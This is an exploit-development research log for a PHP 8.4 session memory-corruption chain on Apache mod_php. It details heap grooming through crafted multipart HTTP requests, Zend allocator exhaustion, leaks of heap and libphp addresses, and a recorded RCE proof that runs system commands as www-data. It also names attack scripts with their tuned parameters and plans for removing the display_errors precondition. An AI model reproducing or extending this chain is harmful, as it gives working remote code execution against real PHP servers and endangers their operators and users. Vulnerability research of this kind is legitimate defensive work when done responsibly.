# Leak path without relying on display_errors: research progress

Date: 2026-10-21
Target: PHP 8.4.26 + Apache 2.4.68 prefork + mod_php (amd64)
Constraints: attack requests use only HTTP; the final target is not instrumented. All gdb measurements in this document were performed on the
**calibration lab 172.16.1.112**, without touching 172.16.0.103.

Status: **the mechanism has been verified as feasible; only the final step — page-level memory exhaustion — remains**. Output from
`display_errors=On` / `max_input_vars` warnings is no longer needed to set `headers_sent`.

---

## 1. Why the original path depended on display_errors

Stage 1/2's A requires:

```text
PS(send_cookie)=1
+
php_session_reset_id() fails (so send_cookie is not cleared)
+
A runs out of memory before RINIT, leaving PS(id) dangling
```

The original implementation used `max_input_vars` warning output to set `SG(headers_sent)` to 1,
making `php_session_send_cookie()` return FAILURE. `php_error_docref` is governed by
`display_errors`; when Off, the warning only goes to the log and produces no output,
`SG(headers_sent)` remains 0, reset_id succeeds and clears `send_cookie`.

---

## 2. Alternatives found to be infeasible

### 2.1 `Expect: 100-continue`

Apache did indeed return the following before PHP processed the request:

```text
HTTP/1.1 100 Continue
```

But PHP's `SG(headers_sent)` was still 0. After A:

```text
ps_globals.id          = 0x7ffff5e6e000
ps_globals.send_cookie = false
```

This shows that 100-continue is handled at the Apache layer and does not set the PHP SAPI's headers_sent.
Ruled out.

### 2.2 Making `sapi_header_op` fail on an invalid header

The `Set-Cookie` value in `php_session_send_cookie()` comes from `php_url_encode(PS(id))`,
and CR/LF/NUL are all encoded as `%XX`; session_name comes from INI and is not attacker-controlled.
When headers_sent is false, `sapi_header_op` only fails if the header contains CR/LF/NUL, which cannot be constructed. Ruled out.

### 2.3 Remotely changing display_errors / error_log

`display_errors` and `error_log` are both PHP_INI_ALL/PERDIR, but the attacker has no
target-side code execution or `.htaccess` write access; `PHP_VALUE` is only effective through the CGI/FastCGI
configuration channel and cannot be injected from request headers under mod_php. Ruled out.

---

## 3. Feasible mechanism: make the OOM happen inside `php_session_reset_id()`

The order in `ext/session/session.c`:

```c
/* php_session_initialize() */
if (!PS(id) || !ZSTR_VAL(PS(id))[0]) {
    ...
    PS(id) = create_sid();
    if (PS(use_cookies)) {
        PS(send_cookie) = 1;          /* <-- set to 1 first */
    }
}
if (php_session_reset_id() == FAILURE) { ... }
```

`php_session_reset_id()`:

```c
if (PS(use_cookies) && PS(send_cookie)) {
    cookies_sent = php_session_send_cookie();
    if (cookies_sent == FAILURE) return FAILURE;
    PS(send_cookie) = 0;              /* <-- cleared only after a successful send */
}
```

`php_session_send_cookie()` must allocate internally:

- the `smart_str` Set-Cookie header (~64B class)
- `php_url_encode(PS(id), 32)` → `zend_string_safe_alloc(3, 32)`:
  `24 + 96 + 1 = 121` → **128B bin**

If these allocations fail in `zend_mm`, `zend_bailout` jumps straight to request
shutdown and `PS(send_cookie)` stays 1; A's big field then continues to OOM the request at
pre-RINIT, leaving `PS(id)` dangling. The whole process needs no warning output.

---

## 4. Lab verification (172.16.1.112, display_errors=Off)

### 4.1 A shape

`tools/send_a_oomreset.py` / `send_a_bin128.py` / `send_a_longfile.py`:

```text
PHPSESSID = "\x00"
PHP_SESSION_UPLOAD_PROGRESS = "pwn"
997 registered padding fields (value size controllable)
file field (filename length controllable)
```

No 12MB big field; the OOM is triggered by padding/file headers at pre-RINIT.

### 4.2 Key measurements

Reading the Zend MM at the `php_session_reset_id` entry with gdb:

```text
V=3000, 997 fields, N128=128:
RESET send=1 size=5878488 real=6291456 limit=8388608 rem=2097152 slot11=(nil) mainfree=0 chunks=3
RESET send=0 ...
```

- `size` has reached ~5.9M, but `real_size` is only 3 chunks = 6M, and
  `rem = limit - real_size = 2MB`, exactly enough for one more new chunk;
- the 128B bin (`free_slot[11]`) is empty;
- the allocation of a page for the cookie's 128B bin still succeeds (from a free page in an existing chunk or from the new chunk).

At V=3200, the padding field's `php_sapi_filter → zend_string_init(3200)`
OOMs **before FILE_START**:

```text
MM_SAFE_ERROR limit=8388608 size=8256744
#4 zend_string_alloc(len=3200)
#6 php_sapi_filter
#7 rfc1867_post_handler
```

This shows that the Zend MM failure point is "needs a new 4KB page but has no new 2MB chunk":

```text
ZEND_MM_CHUNK_SIZE (2MB) > limit - real_size  -> reject new chunk
```

### 4.3 The step currently missing

Use a long filename (the file part's `filename`, not interned, counted toward memory) to push
`real_size` to the limit:

```text
F=688128:
RESET send=1 size=7954856 real=8388608 limit=8388608 rem=0 slot11=(nil)
CHUNK 0 free_pages=0
CHUNK 1 free_pages=0
CHUNK 2 free_pages=68
CHUNK 3 free_pages=4
```

- `rem=0`: no new chunk will be taken;
- the 128B bin is empty: the cookie needs a new page;
- but **72 free pages remain** across the four chunks, and the page for the cookie's 128B bin is successfully
  allocated from the free pages of chunk 2/3 → `send_cookie` is cleared; only A's later
  allocations OOM (id dangling, but send_cookie=false).

Fine-grained scan of F in 4KB steps:

```text
F=688128  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,4   (72)
F=692224  RESET send=1 real=8M rem=0 slot11=NULL  free_pages=0,0,68,1   (69)
F=696320  NO_RESET (OOM before FILE_START)
```

That is, a filename alone can only push the free pages down to 69; adding another 4KB
OOMs earlier, in the filename/header allocation phase, and the remaining 69 pages are always left for the cookie.

**Target state**: at the first `php_session_reset_id`

```text
real_size == limit
rem == 0
free_slot[11] == NULL
all chunks free_pages == 0
```

This makes the allocation of a page for the cookie's 128B bin fail and leaves `send_cookie` at 1.

---

## 4.4 Now achieved: the A primitive under display_errors=Off

The final working A (calibration lab, display_errors=Off):

```text
python3 send_a_idmain.py 129 3000 570 3040 20 1
  parameters: N128=129, V=3000, NH=570, HL=3040, NS=20, N64E=1
```

After A:

```text
ps_globals.id          = 0x7ffff5e6e080   (main chunk, page 0x6e)
ps_globals.send_cookie = true
```

Key points:

1. **997 padding fields** push the heap to `real_size = limit = 8M`;
2. **NH=570 unknown headers of 3040 bytes** push the chunk free pages to 0;
3. **N128=129 values of 103 bytes** empty the 128B bin (the cookie's `url_encode` allocation);
4. **NS=20 headers of 15 bytes** empty the 40B bin (the cookie's first
   `"Set-Cookie: "` smart_str allocation);
5. when `php_session_send_cookie` is entered:
   `slot4 != NULL, slot11 == NULL, sum(free_pages) == 0`;
   the 40B allocation uses an existing slot, the 128B allocation has no page available → OOM;
6. `send_cookie` stays 1, `PS(id)` is dangling, the child survives;
7. **N64E=1 ordinary field of 39 bytes is placed at the start of the padding**, making the 64B bin
   allocate a page early in the main chunk; the later id reuses that page and lands at
   `chunk+0x6e080` instead of in the non-main chunk freed during shutdown.

Measured post-A:

```text
NS=12/20/27:
$1 = 0x7ffff3dff000  $2 = true     # early version (id in chunk3)
N128=129, N64E=1:
$1 = 0x7ffff5e6e080  $2 = true     # id in main chunk
```

This is `send_cookie=1 + dangling PS(id)` with **no dependence on display_errors at all**.

---

## 5.1 Current calibration state of the B leak

B needs to reoccupy `0x7ffff5e6e080` (64B-aligned, page 0x6e, offset 0x80 within the page) with a
fake zend_string. Current progress:

- A's id page `0x6e000` is re-partitioned as a **16B bin** during B cleanup
  (`map[0x6e]=0x80000001`), and the id block becomes a 16B free-list chain;
- measured addresses of B's forge raw buffer (`php_sapi_filter`, val_len branch):
  - 32B forge: `0x7ffff5e011a0` (page 0x1)
  - 64B forge: B's 64B bin also fails to claim 0x6e;
- reason: Zend MM's bin page allocation prefers low-address free pages; A's id page 0x6e
  is a page A obtained only when its heap was nearly full, whereas B's 32B/64B bins take low pages
  first (0x1, 0x2, …), and the 16B/8B temporary strings claim 0x6e first.
- fixed a bug in B's multipart construction: there must be `\r\n\r\n` between header and body,
  otherwise the value lengths of forge/PHPSESSID/progress are all 0.

Next steps (in priority order):

1. **Page steering**: place a large field (or a group of medium fields) before B's forge part,
   consuming low-address free pages so that the next page for the 32B/64B bins lands on 0x6e; then place
   4 live 32B headers (slot0–3) and the 32B forge raw buffer (slot4=id) according to the slot count.
2. **Move A's id page**: change N64E (the number of early 39B fields) or the padding order
   so that the id page lands on the low page actually used by B's 32B/64B bins; the id must be in the main chunk,
   otherwise shutdown will free that chunk.
3. **16B geometry**: the id page has already been re-partitioned by the 16B bin; to take the 16B route, two
   16B slots must still be live at cleanup with controllable contents (currently both raw/param get
   overwritten by the free-list next), which is harder.

### 5.2 64B geometry: one page short of a hit

After fixing the missing multipart blank line, the measured addresses of B's 64B forge raw buffers were:

```text
b_forge64_first (2 39B headers + forge 63B, forge part first):
  FORGE raw = 0x7ffff5e6f000   (page 0x6f, slot0)

b_forge64_pre (2 39B ordinary fields + forge 63B):
  FORGE raw = 0x7ffff5e6f100   (page 0x6f, slot4)
```

A's id:

```text
0x7ffff5e6e080   (page 0x6e, slot2)
```

That is, the 64B bin's new page consistently lands on **0x6f**, while A's id page 0x6e is
claimed first by 16B/32B temporary strings (`map[0x6e]` was `0x80000001` at B cleanup). The two are one page apart.

Try moving A's id to 0x6f: raise the number of early 39B fields to N64E=64
(N128=192), filling all 64 64B slots on 0x6e. NH re-tuning results:

```text
NH=632  RESET send=1 free=31 SEND0=1  POST id=0 send=false
NH=660  RESET send=1 free=3  SEND0=0  POST id=0 send=false
NH=670  NO_RESET
```

Reset is reached and sending the cookie may fail, but A's child is replaced after shutdown and
`PS(id)/send_cookie` are lost. Completing 64B alignment requires:

1. keeping A's child alive around N64E=64 (change NH/NS/N128, or place the early
   64B fields at a different position) so that the id lands at 0x6f000/0x6f100 with
   post-A `send_cookie=true`; or
2. making B's 64B bin claim page 0x6e before the 16B/32B bins (force a 64B page
   allocation at request startup/before the first few parts, preventing 16B/32B from stealing the page).

### 5.3 Latest alignment experiments (still no hit)

- **B's page fixed at 0x6f**: regardless of forge part order, pre fields, HTTP `X-A/X-B`
  39B headers, 39-character Host, or boundary 17S, the 64B forge raw buffer is always
  `0x7ffff5e6f000` (forge part first) or `0x7ffff5e6f100` (two pre fields).
  Server var/bin page contention during request startup lets 16B/32B take 0x6e first,
  and the 64B bin gets 0x6f.
- **Moving the id on A's side**:
  - `N64H=62` 39B headers, NH=565: the child survives, but the id is still
    `0x6e080` (the headers did not consume this head slot);
  - `N64H=63..70`: the id is still `0x6e080`;
  - `N64H=80`: the id jumps to `0x7ffff5dfef40` (not the target page), send=false;
  - K 39B live + 1 63B raw field at the end (LIFO makes the id take the raw slot):
    for K=1..16 with NH=570+K, the child never retains the id;
  - `N64E=64` fills all 64 64B slots on 0x6e; with NH=632..660 reset is reached and the
    cookie send may fail, but A's child is replaced after shutdown, post id=0.

Conclusion: the A primitive is stable, and B's 64B forge is only one page off; but making A's id land at
0x6f000/0x6f100 while keeping the child alive, or making B's 64B bin capture 0x6e,
still requires further tuning of the heap/page order.

Once B's forge raw buffer lands at `0x7ffff5e6e080`, `Set-Cookie` becomes an out-of-bounds read with
`len=0x1000`, and the rest of B's decoding/chunk-base flow is identical to the original
display_errors path.

---

## 5. Strategy for consuming the remaining pages

The 72 free pages (288KB) need to be consumed **after the filename and before reset**, but
without a transient peak exceeding the free pages. Verified limits:

- Field names are interned (`php_register_variable_quick` →
  `zend_string_init_interned`) and **do not count toward memory_limit**; lengthening field names is useless.
- A single oversized padding field (>3072) has the raw buffer and value string present
  simultaneously in the filter, a peak of ~2×, and OOMs early.
- A long filename also has two copies (header line + filename), a peak of ~2×; at F=688K
  72 pages remain, while F≥720K OOMs early.

Feasible directions (in priority order):

1. **Multiple medium allocations in sequence, with the transient buffer released between allocations**
   - e.g. multiple long header values of the file part (filename, Content-Type) or
     multiple medium value fields;
   - each allocation peaks at 2×, but the previous raw/line buffer is freed before the next one is made;
   - net live growth can consume the 72 pages step by step while the peak stays within the remaining pages.
2. **Move the remaining-page consumption to after the filename, inside FILE_START**
   - the filename itself is already the last large live string before reset;
   - if another long string that also belongs before FILE_START but is allocated after the filename could be added
     (e.g. Content-Type), more pages could be consumed without raising the peak.
3. **Fill the remaining pages with live values/page allocations from multiple small bins**
   - the remaining 69 pages are in the free_pages of chunks 2/3 and are **page-level free pages**;
     the filename's large allocation does not use them (free_pages unchanged).
   - the **bin slow path** before reset must allocate new pages multiple times, consuming
     these 69 pages one by one; e.g. spread the value sizes of the 997 padding fields across multiple bins
     so that each bin's current page is exactly filled and the next field triggers a new page.
   - each new bin page consumes 1 free_page; the goal is `sum(free_pages)==0` at the first reset,
     after which allocation of a new page for the cookie's 128B bin fails.
   - the 2× peak of a single field still constrains total live memory; using multiple medium fields and letting
     the raw buffer be freed between fields allows incremental progress.

After each parameter adjustment, use `tools/chunks2.gdb` on the calibration lab to inspect the first reset's
`real/rem/slot11/free_pages per chunk`; on a hit, post-A should show:

```text
ps_globals.id          != 0
ps_globals.send_cookie == true
```

B still uses the original 80B/64B forge B, requiring only that the id block address be re-calibrated for the new A (B's K/offset); the leak no longer depends on display_errors.

---

## 6. Files

| File | Purpose |
|---|---|
| `tools/send_a_oomreset.py` | basic OOM-reset A (N fields of V bytes + file) |
| `tools/send_a_bin128.py` | fill the 128B bin with 103B values (same bin as the cookie's e_id) |
| `tools/send_a_longfile.py` | consume chunk free pages with a long filename (not interned) |
| `tools/mem2.gdb` | print size/real/limit/rem/slot11 at the reset entry |
| `tools/chunks2.gdb` | print free_pages for all chunks |
| `tools/oomsite2.gdb` | capture `zend_mm_safe_error`'s call site and backtrace |

---

## 7. Conclusion

- The original path's `display_errors` dependency comes from warning output setting `headers_sent`;
- `100-continue`, invalid headers, and remote INI changes are all infeasible;
- **making the OOM happen inside `php_session_reset_id()`** is a feasible alternative: under the calibration
  lab's `display_errors=Off` the heap has been pushed to `real=limit, rem=0, 128B bin empty`, with only
  the last 72 chunk free pages left to exhaust;
- **A's side now works**: `send_a_idmain.py 129 3000 570 3040 20 1` under
  display_errors=Off leaves `send_cookie=1` and a dangling PS(id) in the main chunk
  (`chunk+0x6e080`);
- the remaining work is only calibrating where B's fake zend_string lands (page steering/slot alignment),
  not a new primitive.

---

## 8. RCE verification and final status of the display_errors dependency (2026-10-21 20:16)

### 8.1 RCE proof on the reference lab

The original chain was run end-to-end on `172.16.0.103` (ASLR-on, single-worker prefork) with
`tools/pure_aslr_run.sh`:

```text
W1=925534  chunk=0x7f2517800000  attempt=1
W2=925632  libphp=0x7f2516000000 attempt=1
W3=925730  HTDATA=0x7f251786e0d8 ZIF=0x7f251643a870 attempt=1
PROOF: uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

That is: two `Set-Cookie` leaks (chunk, libphp) + `zif_system`
(`libphp+0x43a870`) for end-to-end RCE, with all attack requests sent over HTTP.

### 8.2 This chain's display_errors dependency

The A in `send_a_leak2/leak3` relies on `max_input_vars` warning output to set
`SG(headers_sent)` to 1, causing `php_session_reset_id()` to fail before
`php_session_send_cookie()`, thereby leaving a dangling
`PS(id)` with `send_cookie=1`. When `display_errors=0` the warning is not output, `headers_sent` is not set,
A's reset sends the cookie normally and clears `send_cookie`, and B's END cleanup leaks nothing.

Measured: with `.103`'s current default `display_errors 0`, running the same driver directly:

```text
W1=924738 chunk=0x0 attempt=1
W1=924835 chunk=0x0 attempt=2
W1=924933 chunk=0x0 attempt=3
HEAP_LEAK_FAILED
```

To verify the command-execution stage, this experiment temporarily changed `display_errors`
in `/etc/apache2/conf-enabled/php8426.conf` on `.103` from `0` to `1`; after the run it was restored to `0`
and `apache2ctl -k restart` was executed; currently `curl 127.0.0.1:8088/index.php` returns `OK`.

### 8.3 Status of the display_errors=Off path

A's side (no warning, no output) now works on the calibration lab:

```text
A: tools/send_a_plain.py 129 3000 570 3040 20 1
RESET send=1 real=8388608 limit=8388608 rem=0 slot11=NULL
B cleanup: PS(id)=0x7ffff5e6e080 send=1, page 0x6e
```

B's side still has not hit. A's id is actually a 32-character random session id (a 64B
zend_string, located in slot2 of 64B page 0x6e); B's 64B forge raw buffer consistently lands on
page 0x6f (`0x7ffff5e6f000`/`…f100`), while page 0x6e is claimed first by 16B/32B temporary strings during
B's request startup (`map[0x6e]=0x80000001` at cleanup).
The 32B variant (forge raw page 0x1 slot13) and the 8-character PHPSESSID variant
(the id becomes 32B but lands on chunk1's 0x…1d7 page) were also tried, and neither aligned with A's id
page/slot.

The next step is still the same alignment problem:
- make A's 64B id page become B's 64B page (0x6e vs 0x6f), or
- make B's 64B bin obtain page 0x6e before the 16B bin (filling the current page with HTTP 39B headers
  did not change the raw page), or
- use an 8-character id to put the id into B's 32B page 0x1 slot13 (requires calibration of A's 32B
  page/slot).

Until then, the pure HTTP chain under `display_errors=0` has not reached RCE; the proven RCE
is the complete chain under the reference configuration (`display_errors=On`).

---

## 9. Latest findings on the pure-HTTP B request (2026-10-21 20:30)

### 9.1 Call site that steals page 0x6e

On `.112`, `tools/slowbins.gdb` (with a breakpoint on `zend_mm_alloc_small_slow`) captured B's 16B slow path:

```text
SLOW bin=1 map6e=0x0
#1 _estrdup (s="Y-000")
#2 multipart_buffer_headers ... main/rfc1867.c:413
```

That is: inside B, the **name** of the first unknown multipart header (e.g. `Y-000`, 6B)
triggers the 16B bin's slow path first, converting the 0x6e page left by A from 64B/24B into 16B.

### 9.2 24B slot forgery attempt

A's id pointer is `0x…6e080`; in B's 24B page, `ZSTR_LEN` is at
`0x…6e090` (slot6). An attempt was made to use "the unknown header value of the last part"
(23B → 24B smart_string, still live at END cleanup) to write `len=0x1000` at slot6:

- `tools/b_24hdr.py`, `b_24cookie.py`, `b_24hold.py` (including 200
  15B dummy headers intended to hold the 24B page);
- result: at cleanup page 0x6e is still `map=0x80000001` (16B),
  `0x6e090 = 0x…6e080` (16B free-list next), and B's response is empty
  (`php_url_encode` reads a huge len → OOM/bailout).

Root cause: multipart headers are C strings. The first byte of the little-endian representation of `len=0x1000` is
`0x00`, so `smart_string_appends`/`strlen` truncate the value at that byte; and a 24B allocation requires a value length of 17–23, whose first 8 bytes cannot simultaneously be non-zero and form a small integer. A raw buffer from a body value can be binary-safe, but it is freed immediately after registration and the first 8 bytes are overwritten by the free-list next; the 24B forgery path is essentially blocked.

### 9.3 A id page scan

```text
N64E=1   id=0x…6e080   (main chunk)
N64E=65  id=0x…83080   (64B page 0x83)
N64E=66  id=0x…83100
N64E=67  id=0x…83180
N64E=64/N128=192/NH=580  id=0x…5dab000 (chunk1)
N64E=64/N128=129/NH=570  id=0x…3dfe000 (chunk1)
```

B's 64B page is always 0x6f (`b_forge64_first` raw=0x…6f000), while
A's 64B page is 0x6e/0x83/chunk1; the two have no stable intersection.

### 9.4 Conclusion

- The 1-day RCE chain itself has been demonstrated end-to-end under the `display_errors=On` reference configuration (Section 8);
- the `display_errors=Off` A primitive holds, but the B leak is still stuck on Zend MM page allocation:
  A's id page (64B) and the 64B/32B/24B pages B can obtain do not coincide, and 24B
  C-string forgery is limited by NUL;
- the next step is either to find a new A shape that places the id exactly on B's first 64B page 0x6f,
  or to switch leak primitives (e.g. make B actually obtain A's 24B/64B page and keep it alive).

---

## 10. Two new attempts: 8B free-list and long header names (2026-10-21 20:50)

### 10.1 8B free-list idea

If A's id page 0x6e were taken by the 8B bin in B, an 8B slot could be used to forge
`ZSTR_LEN`: when a 7-byte body value raw buffer is freed in the 8B bin with the bin's
free list empty, the slot's first qword is written as 0; the same slot is then reused by the 1-character
header name `A` (`estrdup` 2B, 8B bin), writing `A\0`, while the old qword 0
gives `ZSTR_LEN = 0x41`, reading 65 bytes from `0x6e098`, enough to carry adjacent
free-list heap pointers.

`tools/b_8tail.py` constructs this shape (16 short-name headers + 7-byte body
+ 6 `A: B` in the progress part), but at cleanup:

```text
CLEANUP id=0x7ffff5e6e080 send=1
page=0x6e map=0x80000001       # still 16B
0x6e090: 0x7ffff5e6e080        # 16B free-list next
```

The 16B bin (`form-data`/server var etc.) still takes 0x6e before the 8B bin.

### 10.2 Long header names A

Tried changing A's 570 header names from 10 characters to 16 characters (`_estrdup`
17B → 24B bin), to avoid A's 16B bin being filled by the 570 names and thus making B's
first 16B allocation trigger the slow path and steal 0x6e:

```text
A: send_a_longhdr.py 129 3000 570 3040 20 1
Result: reset breakpoint not hit (A OOMs in the header phase; id not created)
B: b_forge64_first raw=0x7ffff5e6f000 (still page 0x6f)
```

The ~7KB added by the long names moved A's OOM earlier than reset; NH must be re-tuned
to preserve both the reset OOM and the 16B bin state, but B's raw page is still 0x6f.

### 10.3 Summary

Measured ownership order of page 0x6e in B:

```text
16B (_estrdup/form-data)  >  24B  >  8B  >  64B
```

A's id page (64B) is always taken by a smaller bin first; changing header name lengths on A's side
moves the OOM earlier. All four approaches — warm-up history, 8B free-list, 24B header values, long header names — have been tried, and none has yet written B's fake into A's id `len` field.
